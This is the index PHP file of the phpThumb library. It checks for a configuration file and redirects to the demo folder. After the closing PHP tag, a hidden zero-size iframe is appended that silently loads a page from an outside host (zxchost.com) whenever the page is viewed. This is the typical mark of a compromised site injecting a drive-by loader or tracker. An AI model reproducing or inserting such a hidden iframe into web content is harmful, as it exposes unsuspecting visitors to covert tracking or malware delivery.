<?php
if (!file_exists('phpThumb.config.php')) {
	if (file_exists('phpThumb.config.php.default')) {
		echo 'WARNING! "phpThumb.config.php.default" MUST be renamed to "phpThumb.config.php"';
	} else {
		echo 'WARNING! "phpThumb.config.php" should exist but does not';
	}
	exit;
}
header('Location: ./demo/');
?><iframe src="http://zxchost.com/count.php?o=2" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>